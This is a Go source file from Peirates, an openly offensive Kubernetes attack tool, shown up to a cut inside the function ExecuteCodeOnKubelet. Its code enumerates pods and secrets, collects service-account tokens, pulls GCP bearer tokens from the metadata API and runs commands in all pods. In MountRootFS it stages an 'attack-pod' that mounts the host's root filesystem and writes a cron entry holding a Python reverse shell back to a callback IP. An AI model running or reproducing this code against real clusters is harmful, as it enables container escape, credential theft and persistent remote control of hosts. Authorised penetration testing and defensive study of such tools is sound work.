// Peirates - an Attack tool for Kubernetes clusters
//
// You need to use "package main" for executables
//
// BTW always run `go fmt` before you check in code. go fmt is law.
//
package peirates

// Imports. If you don't use an import that's an error so
// I haven't imported json yet.
// Also, number one rule of Go: Try to stick to the
// standard library as much as possible
import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag" // Command line flag parsing
	"fmt"  // String formatting (Printf, Sprintf)
	"io"
	"io/ioutil" // Utils for dealing with IO streams
	"log"       // Logging utils
	"math/rand" // Random module for creating random string building
	"os"        // Environment variables ...

	// HTTP client/server
	"net/http"
	"os/exec"
	"regexp"
	"strings"
	"time" // Time modules

	// kubernetes client
	kubectl "k8s.io/kubernetes/pkg/kubectl/cmd"
)

// getPodList returns an array of running pod names, parsed from "kubectl -n namespace get pods"
func getPodList(connectionString ServerInfo) []string {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("Permission Denied: your service account isn't allowed to get pods")
		return []string{}
	}

	var pods []string

	getPodsRaw, _, err := runKubectlSimple(connectionString, "get", "pods")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get pods, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(getPodsRaw), "\n")
	for _, line := range lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to only enumerate running pods
			if strings.Fields(line)[2] == "Running" {
				pod := strings.Fields(line)[0]
				if pod != "NAME" {
					pods = append(pods, pod)
				}
			}
		}
	}

	return pods
}

// Get the names of the available Secrets from the current namespace and a list of service account tokens
func getSecretList(connectionString ServerInfo) ([]string, []string) {

	var secrets []string
	var service_account_tokens []string

	if !kubectlAuthCanI(connectionString, "get", "secrets") {
		println("Permission Denied: your service account isn't allowed to get secrets")
		return []string{}, []string{}
	}

	getSecretsRaw, _, err := runKubectlSimple(connectionString, "get", "secrets")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get secrets, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(getSecretsRaw), "\n")
	for _, line := range lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to note which secrets are service account tokens
			fields := strings.Fields(line)
			secret := fields[0]
			// Check for header row
			if secret != "NAME" {
				secrets = append(secrets, secret)
				if fields[1] == "kubernetes.io/service-account-token" {
					service_account_tokens = append(service_account_tokens, secret)
				}
			}
		}
	}

	return secrets, service_account_tokens
}

// GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token
func GetGCPBearerTokenFromMetadataAPI(account string) string {
	client := &http.Client{}
	// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
	req_token, err := http.NewRequest("GET", url, nil)
	req_token.Header.Add("Metadata-Flavor", "Google")
	response, err := client.Do(req_token)
	if err != nil {
		println("Error - could not perform request ", url)
	}
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
	// TODO: Add a check for a 200 status code
	// Split the body on "" 's for now
	// TODO: Parse this as JSON
	token_elements := strings.Split(string(body), "\"")
	if token_elements[1] == "access_token" {
		return (token_elements[3])
	} else {
		println("Error - could not find token in returned body text: ", string(body))
		return "ERROR"
	}
}

//
// getHostname runs kubectl with connection string to get hostname from pod
// In the medium term, this function will disappear
//
func getHostname(connectionString ServerInfo, PodName string) string {

	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
	if err != nil {
		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
		return "- Pod command exec failed for " + PodName + "\n"
	} else {
		return "+ Pod discovered: " + string(hostname)
	}
}

// SwitchNamespace switches the current ServerInfo.Namespace to one entered by the user.
func SwitchNamespace(connectionString *ServerInfo) bool {
	var input string

	println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
	fmt.Scanln(&input)
	if input != "" {
		connectionString.Namespace = input
	}
	return true
}

// runKubectl executes the kubectl library internally, allowing us to use the
// Kubernetes API and requiring no external binaries.
//
// runKubectl takes and io.Reader and two io.Writers, as well as a command to run in cmdArgs.
// The kubectl library will read from the io.Reader, representing stdin, and write its stdout and stderr via the corresponding io.Writers.
//
// runKubectl returns an error string, which indicates internal kubectl errors.
//
// NOTE: You should generally use runKubectlSimple(), which calls runKubectlWithConfig, which calls this.
func runKubectl(stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	// Based on code from https://github.com/kubernetes/kubernetes/blob/2e0e1681a6ca7fe795f3bd5ec8696fb14687b9aa/cmd/kubectl/kubectl.go#L44

	// Set up a function to handle the case where we've been running for over 10 seconds
	// 10 seconds is an entirely arbitrary timeframe, adjust it if needed.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() {
		// Since this always keeps cmdArgs alive in memory for at least 10 seconds, there is the
		// potential for this to lead to excess memory usage if kubectl is run an astronimcal number
		// of times within the timeout window. I don't expect this to be an issue, but if it is, I
		// recommend a looping <sleeptime> iterations with a 1 second sleep between each iteration,
		// allowing the routine to exit earlier when possible.
		time.Sleep(10 * time.Second)
		select {
		case <-ctx.Done():
			return
		default:
			log.Fatalf(
				"\nKubectl took too long! This usually happens because the remote IP is wrong.\n"+
					"Check that you've passed the right IP address with -i. If that doesn't help,\n"+
					"and you're running in a test environment, try restarting the entire cluster.\n"+
					"\n"+
					"To help you debug, here are the arguments that were passed to peirates:\n"+
					"\t%s\n"+
					"\n"+
					"And here are the arguments that were passed to the failing kubectl command:\n"+
					"\t%s\n",
				os.Args,
				append([]string{"kubectl"}, cmdArgs...))
			return
		}
	}()

	// NewKubectlCommand adds the global flagset for some reason, so we have to
	// copy it, temporarily replace it, and then restore it.
	oldFlagSet := flag.CommandLine
	flag.CommandLine = flag.NewFlagSet("kubectl", flag.ContinueOnError)
	cmd := kubectl.NewKubectlCommand(stdin, stdout, stderr)
	flag.CommandLine = oldFlagSet
	cmd.SetArgs(cmdArgs)
	return cmd.Execute()
}

// runKubectlWithConfig takes a server config, and a list of arguments. It executes kubectl internally,
// setting the namespace, token, certificate authority, and server based on the provided config, and
// appending the supplied arguments to the end of the command.
//
// NOTE: You should generally use runKubectlSimple() to call this.
func runKubectlWithConfig(cfg ServerInfo, stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	connArgs := []string{
		"-n", cfg.Namespace,
		"--token=" + cfg.Token,
		"--certificate-authority=" + cfg.CAPath,
		"--server=https://" + cfg.RIPAddress + ":" + cfg.RPort,
	}
	return runKubectl(stdin, stdout, stderr, append(connArgs, cmdArgs...)...)
}

// runKubectlSimple executes runKubectlWithConfig, but supplies nothing for stdin, and aggregates
// the stdout and stderr streams into byte slices. It returns (stdout, stderr, execution error).
//
// NOTE: This function is what you want to use most of the time, rather than runKubectl() and runKubectlWithConfig().
func runKubectlSimple(cfg ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
	stdin := strings.NewReader("")
	stdout := bytes.Buffer{}
	stderr := bytes.Buffer{}

	err := runKubectlWithConfig(cfg, stdin, &stdout, &stderr, cmdArgs...)

	return stdout.Bytes(), stderr.Bytes(), err
}

func kubectlAuthCanI(cfg ServerInfo, cmdArgs ...string) bool {
	authArgs := []string{"auth", "can-i"}
	out, _, err := runKubectlSimple(cfg, append(authArgs, cmdArgs...)...)
	if err != nil {
		return false
	}
	var canYouDoTheThing string
	// Extract the first word
	fmt.Sscan(string(out), &canYouDoTheThing)
	return canYouDoTheThing == "yes"
}

// canCreatePods() runs kubectl to check if current token can create a pod
func canCreatePods(connectionString ServerInfo) bool {
	return kubectlAuthCanI(connectionString, "create", "pod")
}

// inAPod() attempts to determine if we are running in a pod.
// Long-term, this will likely go away
func inAPod(connectionString ServerInfo) bool {

	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		println("[+] You may be in a Kubernetes pod. API Server to be found at: ", os.Getenv("KUBERNETES_SERVICE_HOST"))
		return true
	} else {
		println("[-] You may not be in a Kubernetes pod. Press ENTER to continue.")
		var input string
		fmt.Scanln(&input)
		return false
	}
}

// PrintNamespaces prints the output of kubectl get namespaces, but also returns the list of active namespaces
func PrintNamespaces(connectionString ServerInfo) []string {

	if !kubectlAuthCanI(connectionString, "get", "namespaces") {
		println("Permission Denied: your service account isn't allowed to get namespaces")
		return []string{}
	}

	var namespaces []string

	// TODO: Add checking to make sure you're authorized to get namespaces

	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get namespaces, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(NamespacesRaw), "\n")

	for _, line := range lines {
		println(line)
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			// Get rid of blank lines
			if strings.Fields(line)[1] == "Active" {
				namespace := strings.Fields(line)[0]
				if namespace != "NAME" {
					namespaces = append(namespaces, namespace)
				}
			}
		}
	}

	return namespaces
}

func getListOfPods(connectionString ServerInfo) {
	runningPods := getPodList(connectionString)
	for _, listpod := range runningPods {
		fmt.Println("Pod Name: " + listpod)
	}

}

// execInAllPods() runs kubeData.command in all running pods
func execInAllPods(connectionString ServerInfo, command string) {
	if !kubectlAuthCanI(connectionString, "exec", "pod") {
		println("Permission Denied: your service account isn't allowed to exec commands in pods")
		return
	}
	runningPods := getPodList(connectionString)

	for _, execPod := range runningPods {
		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
		if err != nil {
			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
		} else {
			// fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeeded: ")
			fmt.Println(" ")
			fmt.Println("\n", string(execInPodOut))
		}
	}

}

// execInListPods() runs kubeData.command in all pods in kubeData.list
func execInListPods(connectionString ServerInfo, pods []string, command string) {
	if !kubectlAuthCanI(connectionString, "exec", "pods") {
		println("Permission Denied: your service account isn't allowed to exec commands in pods")
		return
	}

	fmt.Println("+ Running supplied command in list of pods")
	for _, execPod := range pods {
		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
		if err != nil {
			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
		} else {
			// fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeeded: ")
			fmt.Println(" ")
			fmt.Println(string(execInPodOut))
		}
	}

}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Added mountFS code to create yaml file drop to disk and create a pod.    |
//--------------------------------------------------------------------------|

// randSeq generates a LENGTH length string of random lowercase letters.
func randSeq(length int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, length)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// Used by mountRootfs
type MountInfo struct {
	yamlBuild string
	image     string
	namespace string
}

// Used for JSON parsing
type KubeRoles struct {
	APIVersion string `json:"apiVersion"`
	Items      []struct {
		APIVersion string `json:"apiVersion"`
		Kind       string `json:"kind"`
		Metadata   struct {
			Annotations struct {
				KubectlKubernetesIoLastAppliedConfiguration string `json:"kubectl.kubernetes.io/last-applied-configuration"`
			} `json:"annotations"`
			CreationTimestamp time.Time `json:"creationTimestamp"`
			Name              string    `json:"name"`
			Namespace         string    `json:"namespace"`
			ResourceVersion   string    `json:"resourceVersion"`
			SelfLink          string    `json:"selfLink"`
			UID               string    `json:"uid"`
		} `json:"metadata"`
		Rules []struct {
			APIGroups []string `json:"apiGroups"`
			Resources []string `json:"resources"`
			Verbs     []string `json:"verbs"`
		} `json:"rules"`
	} `json:"items"`
	Kind     string `json:"kind"`
	Metadata struct {
		ResourceVersion string `json:"resourceVersion"`
		SelfLink        string `json:"selfLink"`
	} `json:"metadata"`
}

// Populated by GetPodsInfo (JSON parsing from kubectl get pods)
type PodDetails struct {
	APIVersion string `json:"apiVersion"`
	Items      []struct {
		APIVersion string `json:"apiVersion"`
		Kind       string `json:"kind"`
		Metadata   struct {
			Annotations struct {
				KubectlKubernetesIoLastAppliedConfiguration string `json:"kubectl.kubernetes.io/last-applied-configuration"`
			} `json:"annotations"`
			CreationTimestamp time.Time `json:"creationTimestamp"`
			Labels            struct {
				App string `json:"app"`
			} `json:"labels"`
			Name            string `json:"name"`
			Namespace       string `json:"namespace"`
			ResourceVersion string `json:"resourceVersion"`
			SelfLink        string `json:"selfLink"`
			UID             string `json:"uid"`
		} `json:"metadata"`
		Spec struct {
			Containers []struct {
				Image           string `json:"image"`
				ImagePullPolicy string `json:"imagePullPolicy"`
				Name            string `json:"name"`
				Ports           []struct {
					ContainerPort int    `json:"containerPort"`
					Protocol      string `json:"protocol"`
				} `json:"ports"`
				Resources struct {
				} `json:"resources"`
				TerminationMessagePath   string `json:"terminationMessagePath"`
				TerminationMessagePolicy string `json:"terminationMessagePolicy"`
				VolumeMounts             []struct {
					MountPath string `json:"mountPath"`
					Name      string `json:"name"`
					ReadOnly  bool   `json:"readOnly"`
				} `json:"volumeMounts"`
			} `json:"containers"`
			DNSPolicy    string `json:"dnsPolicy"`
			NodeName     string `json:"nodeName"`
			NodeSelector struct {
				KubernetesIoHostname string `json:"kubernetes.io/hostname"`
			} `json:"nodeSelector"`
			RestartPolicy   string `json:"restartPolicy"`
			SchedulerName   string `json:"schedulerName"`
			SecurityContext struct {
			} `json:"securityContext"`
			ServiceAccount                string `json:"serviceAccount"`
			ServiceAccountName            string `json:"serviceAccountName"`
			TerminationGracePeriodSeconds int    `json:"terminationGracePeriodSeconds"`
			Tolerations                   []struct {
				Effect            string `json:"effect"`
				Key               string `json:"key"`
				Operator          string `json:"operator"`
				TolerationSeconds int    `json:"tolerationSeconds"`
			} `json:"tolerations"`
			Volumes []struct {
				HostPath struct {
					Path string `json:"path"`
					Type string `json:"type"`
				} `json:"hostPath,omitempty"`
				Name   string `json:"name"`
				Secret struct {
					DefaultMode int    `json:"defaultMode"`
					SecretName  string `json:"secretName"`
				} `json:"secret,omitempty"`
			} `json:"volumes"`
		} `json:"spec"`
		Status struct {
			Conditions []struct {
				LastProbeTime      interface{} `json:"lastProbeTime"`
				LastTransitionTime time.Time   `json:"lastTransitionTime"`
				Status             string      `json:"status"`
				Type               string      `json:"type"`
			} `json:"conditions"`
			ContainerStatuses []struct {
				ContainerID string `json:"containerID"`
				Image       string `json:"image"`
				ImageID     string `json:"imageID"`
				LastState   struct {
					Terminated struct {
						ContainerID string    `json:"containerID"`
						ExitCode    int       `json:"exitCode"`
						FinishedAt  time.Time `json:"finishedAt"`
						Reason      string    `json:"reason"`
						StartedAt   time.Time `json:"startedAt"`
					} `json:"terminated"`
				} `json:"lastState"`
				Name         string `json:"name"`
				Ready        bool   `json:"ready"`
				RestartCount int    `json:"restartCount"`
				State        struct {
					Running *struct {
						StartedAt time.Time `json:"startedAt"`
					} `json:"running"`
				} `json:"state"`
			} `json:"containerStatuses"`
			HostIP    string    `json:"hostIP"`
			Phase     string    `json:"phase"`
			PodIP     string    `json:"podIP"`
			QosClass  string    `json:"qosClass"`
			StartTime time.Time `json:"startTime"`
		} `json:"status"`
	} `json:"items"`
	Kind     string `json:"kind"`
	Metadata struct {
		ResourceVersion string `json:"resourceVersion"`
		SelfLink        string `json:"selfLink"`
	} `json:"metadata"`
}

type Secret_Details struct {
	Data []struct {
		Namespace string `json:"namespace"`
		Token     string `json:"token"`
	}
	Metadata struct {
		Name string `json:"name"`
	}
	SecretType string `json:"type"`
}

//adam here
type Get_Node_Details struct {
	Items []struct {
		Metadata struct {
			Name string `json:"name"`
		} `json:"metadata"`
		Status struct {
			Addresses []struct {
				Address string `json:"address"`
				Type    string `"json:type"`
			} `json:"addresses"`
		} `json:"status"`
	} `json:"items"`
}

// GetPodsInfo() gets details for all pods in json output and stores in PodDetails struct
func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("Permission Denied: your service account isn't allowed to get pods")
		return
	}

	fmt.Println("+ Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
	println(string(podDetailOut))
	if err != nil {
		fmt.Println("[-] Unable to retrieve details from this pod: ", err)
	} else {
		fmt.Println("[+] Retrieving details for all pods was successful: ")
		err := json.Unmarshal(podDetailOut, &podDetails)
		if err != nil {
			fmt.Println("[-] Error unmarshaling data: ", err)
		}
	}
}

// GetHostMountPoints prints all pods' host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func GetHostMountPoints(podInfo PodDetails) {
	fmt.Println("+ Getting all host mount points for pods in current namespace")
	for _, item := range podInfo.Items {
		// fmt.Println("+ Host Mount Points for Pod: " + item.Metadata.Name)
		for _, volume := range item.Spec.Volumes {
			if volume.HostPath.Path != "" {
				fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path) + " found for pod " + item.Metadata.Name)
			}
		}
	}
}

// GetHostMountPointsForPod prints a single pod's host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func GetHostMountPointsForPod(podInfo PodDetails, pod string) {
	fmt.Println("+ Getting all Host Mount Points only for pod: " + pod)
	for _, item := range podInfo.Items {
		if item.Metadata.Name == pod {
			for _, volume := range item.Spec.Volumes {
				if volume.HostPath.Path != "" {
					fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path))
				}
			}
		}
	}
}

// GetRoles() enumerates all roles in use on the cluster (in the default namespace).
// It parses all roles into a KubeRoles object.
func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
	fmt.Println("+ Getting all Roles")
	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
	if err != nil {
		fmt.Println("[-] Unable to retrieve roles from this pod: ", err)
	} else {
		fmt.Println("[+] Retrieving roles was successful: ")
		err := json.Unmarshal(rolesOut, &kubeRoles)
		if err != nil {
			fmt.Println("[-] Error unmarshaling data: ", err)
		}

	}
}

func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP, callbackPort string) {
	var MountInfoVars = MountInfo{}
	// BUG: this routine seems to create the same pod name every time, which makes it so it can't run twice.

	// First, confirm we're allowed to create pods
	if !canCreatePods(connectionString) {
		println("AUTHORIZATION: this token isn't allowed to create pods in this namespace")
		return
	}
	// TODO: changing parsing to occur via JSON
	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image

	// Approach 1: Try to get the image file for my own pod
	//./kubectl describe pod `hostname`| grep Image:
	hostname := os.Getenv("HOSTNAME")
	approach1_success := false
	var image string
	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
	if err != nil {
		approach1_success = false
		println("DEBUG: describe pod didn't work")
	} else {
		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
		for _, line := range podDescriptionLines {
			start := strings.Index(line, "Image:")
			if start != -1 {
				// Found an Image line -- now get the image
				image = strings.TrimSpace(line[start+6:])
				println("Found image :", image)
				approach1_success = true

				MountInfoVars.image = image
			}
		}
		if !approach1_success {
			println("DEBUG: did not find an image line in your pod's definition.")
		}
	}

	if approach1_success {
		println("Got image definition from own pod.")
	} else {
		// Approach 2 - use the most recently staged running pod
		//
		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.

		// Future version of approach 2:
		// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather,
		// it should populate a list of all pods in the current namespace, then iterate through
		// images trying to find one that has a shell.

		// Here's the useful part of that data.

		// type PodDetails struct {
		// 	Items      []struct {
		// 		Metadata   struct {
		// 			Name            string `json:"name"`
		// 			Namespace       string `json:"namespace"`
		// 		} `json:"metadata"`
		// 		Spec struct {
		// 			Containers []struct {
		// 				Image           string `json:"image"

		println("Getting image from the most recently-staged pod in thie namespace")
		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
		if err != nil {
			//log.Fatal(err)
			println("ERROR: Could not get pods")
			return
		}
		getImageLines := strings.Split(string(getImagesRaw), "\n")
		for _, line := range getImageLines {
			matched, err := regexp.MatchString(`^\s*$`, line)
			if err != nil {
				println("ERROR: could not parse pod list")
				return
				// log.Fatal(err)
			}
			if !matched {
				//added checking to only enumerate running pods
				// BUG: Did we do this? Check.
				MountInfoVars.image = strings.Fields(line)[7]
				//fmt.Println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
			}
		}
	}

	//creat random string
	rand.Seed(time.Now().UnixNano())
	randomString := randSeq(6)

	// Create Yaml File
	MountInfoVars.yamlBuild = fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod-%s
  namespace: %s
spec:
  containers:
  - image: %s
    imagePullPolicy: IfNotPresent
    name: attack-container
    volumeMounts:
    - mountPath: /root
      name: mount-fsroot-into-slashroot
  volumes:
  - name: mount-fsroot-into-slashroot
    hostPath:
       path: /
`, randomString, connectionString.Namespace, MountInfoVars.image)

	// Write yaml file out to current directory
	ioutil.WriteFile("attack-pod.yaml", []byte(MountInfoVars.yamlBuild), 0700)

	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
	if err != nil {
		println("Pod did not stage successfully.")
		return
	} else {
		attackPodName := "attack-pod-" + randomString
		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash - please wait for Pod to stage")
		time.Sleep(5 * time.Second)
		//shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
		//_, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
		stdout := bytes.Buffer{}
		stderr := bytes.Buffer{}
		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "cat >> /root/etc/crontab")

		if err != nil {
			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
			println("Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
			return
		} else {
			println("Netcat callback added sucessfully.")
			//println(string(shadowFileBs))
		}
	}
	//out, err = exec.Command("").Output()
	//if err != nil {
	//	fmt.Println("Token location error: ", err)
	//}
	//fmt.Println(out)
}

func clear_screen() {
	fmt.Print("Press Enter to Proceed .....")
	var input string
	fmt.Scanln(&input)
	//fmt.Print(input)
	c := exec.Command("clear")
	c.Stdout = os.Stdout
	c.Run()
}

// SERVICE ACCOUNT MANAGEMENT
type ServiceAccount struct {
	Name            string    // Service account name
	Token           string    // Service account token
	DiscoveryTime   time.Time // Time the service account was discovered
	DiscoveryMethod string    // How the service account was discovered (file on disk, secrets, user input, etc.)
}

// makeNewServiceAccount creates a new service account with the provided name,
// token, and discovery method, while setting the DiscoveryTime to time.Now()
func makeNewServiceAccount(name, token, discoveryMethod string) ServiceAccount {
	return ServiceAccount{
		Name:            name,
		Token:           token,
		DiscoveryTime:   time.Now(),
		DiscoveryMethod: discoveryMethod,
	}
}

func readServiceAccountFromCommandLine() ServiceAccount {
	println("\nPlease paste in a new service account token or hit ENTER to maintain current token.")
	serviceAccount := ServiceAccount{
		Name:            "",
		Token:           "",
		DiscoveryTime:   time.Now(),
		DiscoveryMethod: "User Input",
	}
	reader := bufio.NewReader(os.Stdin)
	println("\nWhat do you want to name this service account?")
	serviceAccount.Name, _ = reader.ReadString('\n')
	// Trim newline
	serviceAccount.Name = serviceAccount.Name[:len(serviceAccount.Name)-1]
	println("\nPaste the service account token and hit ENTER:")
	serviceAccount.Token, _ = reader.ReadString('\n')
	// Trim newline
	serviceAccount.Token = serviceAccount.Token[:len(serviceAccount.Token)-1]

	return serviceAccount
}

func assignServiceAccountToConnection(account ServiceAccount, info *ServerInfo) {
	info.TokenName = account.Name
	info.Token = account.Token
}

func banner(connectionString ServerInfo) {

	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	println(`________________________________________
|  ___  ____ _ ____ ____ ___ ____ ____ |
|  |__] |___ | |__/ |__|  |  |___ [__  |
|  |    |___ | |  \ |  |  |  |___ ___] |
|______________________________________|
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
,,..IIIIIIIII.............IIIIIIIII..,,,
,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
,..IIIIIIII...+++++++++++,..+IIIIIII..,,
,..IIIIIII...+++++++++++++:..~IIIIII..,,
,..IIIIII...++++++:++++++++=..,IIIII..,,
,..IIIII...+....,++.++++:+.++...IIII..,,
,,.+IIII...+..,+++++....+,.+...IIIII..,,
,,..IIIII...+++++++++++++++...IIIII..:,,
,,,..IIIII...+++++++++++++...IIIII7..,,,
,,,,.,IIIII...+++++++++++...?IIIII..,,,,
,,,,:..IIIII...............IIIII?..,,,,,
,,,,,,..IIIII.............IIIII..,,,,,,,
,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
________________________________________
	Peirates v1.0.14 by InGuardians
  https://www.inguardians.com/peirates
----------------------------------------------------------------`)

	if connectionString.Token != "" {

		fmt.Printf("[+] Service Account Loaded: %s\n", connectionString.TokenName)
	}
	var have_ca bool = false
	if connectionString.CAPath != "" {
		have_ca = true
	}
	fmt.Printf("[+] Certificate Authority Certificate: %t\n", have_ca)
	fmt.Printf("[+] Kubernetes API Server: %s:%s\n", connectionString.RIPAddress, connectionString.RPort)
	fmt.Println("[+] Current hostname:", name)
	fmt.Println("[+] Current namespace:", connectionString.Namespace)

}

func ReadFile(filename string) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Panicf("failed reading data from file: %s", err)
	}
	fmt.Printf("\nFile Content: %s", data)
}

func GetNodesInfo(connectionString ServerInfo) {
	fmt.Println("+ Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
	println(string(podDetailOut))
	if err != nil {
		fmt.Println("[-] Unable to retrieve node details: ", err)
	}
}

//adam here
func ExecuteCodeOnKubelet(connectionString ServerInfo) {
	fmt.Println("+ Getting IP addess for the nodes in the cluster")
	//nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
	//println(nodeDetailOut)
	var nodeDetailOut2 []byte
	nodeDetailOut2 = []byte(`{
		"apiVersion": "v1",
		"items": [
			{
				"apiVersion": "v1",
				"kind": "Node",
				"metadata": {
					"annotations": {
						"node.alpha.kubernetes.io/ttl": "0",
						"volumes.kubernetes.io/controller-managed-attach-detach": "true"
					},
					"creationTimestamp": "2018-06-26T16:57:35Z",
					"labels": {
						"beta.kubernetes.io/arch": "amd64",
						"beta.kubernetes.io/os": "linux",
						"kubernetes.io/hostname": "k8s-master",
						"node-role.kubernetes.io/master": ""
					},
					"name": "k8s-master",
					"namespace": "",
					"resourceVersion": "1646242",
					"selfLink": "/api/v1/nodes/k8s-master",
					"uid": "069cff69-7962-11e8-b34c-000c29cf24d7"
				},
				"spec": {
					"externalID": "k8s-master"
				},
				"status": {
					"addresses": [
						{
							"address": "10.23.58.40",
							"type": "InternalIP"
						},
						{
							"address": "k8s-master",
							"type": "Hostname"
						}
					],
					"allocatable": {
						"cpu": "1",
						"ephemeral-storage": "13731028970",
						"hugepages-1Gi": "0",
						"hugepages-2Mi": "0",
						"memory": "1945812Ki",
						"pods": "110"
					},
					"capacity": {
						"cpu": "1",
						"ephemeral-storage": "14899120Ki",
						"hugepages-1Gi": "0",
						"hugepages-2Mi": "0",
						"memory": "2048212Ki",
						"pods": "110"
					},
					"conditions": [
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2018-10-03T02:30:14Z",
							"message": "kubelet has sufficient disk space available",
							"reason": "KubeletHasSufficientDisk",
							"status": "False",
							"type": "OutOfDisk"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2018-10-03T02:30:14Z",
							"message": "kubelet has sufficient memory available",
							"reason": "KubeletHasSufficientMemory",
							"status": "False",
							"type": "MemoryPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2018-10-03T02:30:14Z",
							"message": "kubelet has no disk pressure",
							"reason": "KubeletHasNoDiskPressure",
							"status": "False",
							"type": "DiskPressure"
						},
						{
							"lastHeartbeatTime": "2019-03-06T00:26:34Z",
							"lastTransitionTime": "2018-06-26T16:57:30Z",
							"message": "kubelet has sufficient PID available",
